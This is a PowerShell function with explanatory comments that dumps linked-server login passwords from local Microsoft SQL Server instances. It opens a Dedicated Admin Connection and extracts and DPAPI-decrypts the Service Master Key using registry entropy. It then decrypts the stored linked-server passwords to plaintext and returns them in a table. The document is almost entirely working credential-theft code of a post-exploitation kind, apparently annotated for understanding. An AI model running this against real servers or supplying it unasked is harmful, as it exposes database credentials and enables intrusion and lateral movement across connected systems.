function Get-MSSQLLinkPasswords {
  # Load .NET assemblies used for cryptography & LINQ/collections (often already loaded but safe to ensure)
  Add-Type -assembly System.Security
  Add-Type -assembly System.Core

  # Prepare a DataTable to collect results (Instance, LinkedServer, Username, Password)
  $Results = New-Object "System.Data.DataTable"
  $Results.Columns.Add("Instance") | Out-Null
  $Results.Columns.Add("LinkedServer") | Out-Null
  $Results.Columns.Add("Username") | Out-Null
  $Results.Columns.Add("Password") | Out-Null

  # Get the local machine name (used for DAC connection string)
  $ComputerName = $Env:computername

  # Read registry key that lists installed SQL Server instances
  # Path: HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server
  # Property: InstalledInstances
  $SqlInstances = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server' -Name InstalledInstances).InstalledInstances

  foreach ($InstanceName in $SqlInstances) {
    # Build a Dedicated Admin Connection (DAC) string.
    # DAC uses prefix "ADMIN:" and is intended for troubleshooting with an administrative connection.
    $ConnString = "Server=ADMIN:$ComputerName\$InstanceName;Trusted_Connection=True"
    if ($InstanceName -eq "MSSQLSERVER") {
      # Default instance has a slightly different connection string (no instance suffix)
      $ConnString = "Server=ADMIN:$ComputerName\;Trusted_Connection=True"
    }

    # Create a SqlConnection object
    $Conn = New-Object System.Data.SqlClient.SQLConnection($ConnString);

    Try {
      # Open the connection (requires appropriate privileges - usually sysadmin)
      $Conn.Open();
    } Catch {
      # If DAC open fails, write an error and continue to next instance
      Write-Error "Error creating DAC connection: $_.Exception.Message"
      Continue
    }

    if ($Conn.State -eq "Open") {
      # Query to get the encrypted Service Master Key (SMK) bytes from sys.key_encryptions table
      # The stored blob has a header/padding; query uses substring to remove the first 8 bytes.
      # key_id 102 is the service master key entry; thumbprint checks which encryption scheme
      $SqlCmd = "SELECT substring(crypt_property,9,len(crypt_property)-8) 
                 FROM sys.key_encryptions 
                 WHERE key_id = 102 
                 AND (thumbprint=0x03 OR thumbprint=0x0300000001)"
      $Cmd = New-Object System.Data.SqlClient.SqlCommand($SqlCmd,$Conn);
      $SmkBytes = $Cmd.ExecuteScalar()

      # Get the entropy bytes from registry for this SQL instance.
      # The registry path under Microsoft SQL Server\Instance Names\sql\<InstanceName> gives the instance id path.
      $RegPath = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\sql\").$InstanceName
      [byte[]]$Entropy = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$RegPath\Security\").Entropy

      # Decrypt the SMK using Windows DPAPI (LocalMachine scope) and the retrieved entropy
      # ProtectedData::Unprotect will use machine keys and the entropy to get the actual service key bytes.
      $ServiceKey = [System.Security.Cryptography.ProtectedData]::Unprotect($SmkBytes, $Entropy, 'LocalMachine')

      # Determine encryption algorithm based on the length of the decrypted SMK:
      # Historically: 3DES (TripleDES) used in older versions (key len 16?), AES used in newer (32 bytes).
      # Choose IV length accordingly (3DES typically 8-byte IV; AES 16-byte IV)
      if (($ServiceKey.Length -eq 16) -or ($ServiceKey.Length -eq 32)) {
        if ($ServiceKey.Length -eq 16) {
          $Decryptor = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider
          $IvLen=8
        }
        if ($ServiceKey.Length -eq 32) {
          $Decryptor = New-Object System.Security.Cryptography.AESCryptoServiceProvider
          $IvLen=16
        }

        # Query linked server login table master.sys.syslnklgns and sysservers to get stored pwdhash
        # pwdhash contains header + IV + ciphertext. We remove header and then split IV and ciphertext.
        $SqlCmd = "SELECT s.srvname
        , l.name
        , SUBSTRING(l.pwdhash, 5, $ivlen) iv
        , SUBSTRING(l.pwdhash, $($ivlen+5), LEN(l.pwdhash)-$($ivlen+4)) pass 
        FROM master.sys.syslnklgns l
          INNER JOIN master.sys.sysservers s ON l.srvid = s.srvid 
        WHERE LEN(pwdhash) > 0"
        $Cmd = New-Object System.Data.SqlClient.SqlCommand($SqlCmd,$Conn);
        $Data = $Cmd.ExecuteReader()
        $Dt = New-Object "System.Data.DataTable"
        $Dt.Load($Data)

        # Iterate over each linked-login row
        foreach ($Logins in $Dt) {
          # Configure decryptor - no padding expected (the script handles trimming manually)
          $Decryptor.Padding = "None"

          # Create decryptor using SMK as key and the IV extracted from the pwdhash blob
          $Decrypt = $Decryptor.CreateDecryptor($ServiceKey,$Logins.iv)

          # Create memory stream with the ciphertext and attach a CryptoStream to decrypt
          $Stream = New-Object System.IO.MemoryStream (,$Logins.pass)
          $Crypto = New-Object System.Security.Cryptography.CryptoStream $Stream,$Decrypt,"Write"
          $Crypto.Write($Logins.pass,0,$Logins.pass.Length)
          [byte[]]$Decrypted = $Stream.ToArray()

          # Convert decrypted bytes into Unicode string
          $EncodingType = "System.Text.UnicodeEncoding"
          $Encode = New-Object $EncodingType

          # The decrypted data has header/padding issues; here script attempts to strip
          # the first 8 bytes and any trailing zero pairs to clean up the string.
          # This heuristic may vary by SQL version.
          $i = 8
          foreach ($b in $Decrypted) {
            if ($Decrypted[$i] -ne 0 -and $Decrypted[$i+1] -ne 0 -or $i -eq $Decrypted.Length) {
              $i -= 1; 
              break;
            }; 
            $i += 1;
          }
          $Decrypted = $Decrypted[8..$i]

          # Add the instance, linked server name, login name and the decrypted password text to the results table
          $Results.Rows.Add(
            $InstanceName
          , $($Logins.srvname)
          , $($Logins.name)
          , $($Encode.GetString($Decrypted))
          ) | Out-Null
        }
      } else {
        # If the Service Key is an unexpected length, write an error
        Write-Error "Unknown key size"
      }
      # Close SQL connection for this instance
      $Conn.Close();
    }
  }
  # Return the DataTable containing the found credentials
  $Results
}
